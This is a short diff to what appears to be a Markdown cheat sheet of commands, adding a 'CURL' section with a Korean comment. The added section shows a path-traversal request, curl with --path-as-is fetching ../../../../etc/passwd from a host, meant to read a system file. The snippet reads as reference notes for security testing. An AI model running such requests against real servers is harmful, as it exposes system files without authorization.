@@ -194,3 +194,14 @@ select * from user;
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>CURL</strong></summary>
+
+```bash
+curl --path-as-is http://10.10.10.10/../../../../etc/passwd
+```
+- `../../`와 같은 경로를 그대로 전달
+
+</details>
